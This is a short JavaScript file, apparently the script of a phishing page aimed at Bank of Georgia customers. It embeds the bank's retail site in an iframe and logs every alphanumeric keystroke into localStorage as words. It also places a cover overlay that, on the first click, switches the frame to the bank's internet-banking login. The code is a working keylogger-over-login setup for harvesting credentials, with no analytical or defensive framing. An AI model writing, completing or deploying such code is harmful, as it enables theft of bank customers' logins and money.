let pageUrl = "https://bankofgeorgia.ge/ka/retail"; // Replace with the bank URL
function loadBankPage() {
  const iframe = document.getElementById("pageFrame");
  iframe.src = pageUrl;

  if (!localStorage.getItem("refreshedOnce")) {
    localStorage.setItem("refreshedOnce", "true");

    setTimeout(function () {
      location.reload();
    }, 1000);
  }
}

loadBankPage();

let currentInput = "";
let timer = null;

document.addEventListener("keydown", function (event) {
  const pressedKey = event.key;

  if (pressedKey.match(/[a-zA-Z0-9 ]/)) {
    currentInput += pressedKey;

    clearTimeout(timer);

    timer = setTimeout(() => {
      saveWord(currentInput);
      currentInput = "";
    }, 1000);
  }
});

function saveWord(word) {
  let words = JSON.parse(localStorage.getItem("words")) || [];
  words.push(word);
  localStorage.setItem("words", JSON.stringify(words));
  console.log("Saved words:", words);
}

function loadSavedWords() {
  const savedWords = JSON.parse(localStorage.getItem("words")) || [];
  if (savedWords.length > 0) {
    console.log("Saved words from localStorage:", savedWords);
  }
}

loadSavedWords();

function clickRetail() {
  const iframe = document.getElementById("cover");
  let countClick = 0;

  iframe.addEventListener("click", (event) => {
    if (event.isTrusted) countClick++;
    if (countClick == 1) {
      const iframeElement = document.getElementById("pageFrame");
      iframeElement.src = "https://ibank.bog.ge/";
    }
  });
}

clickRetail();
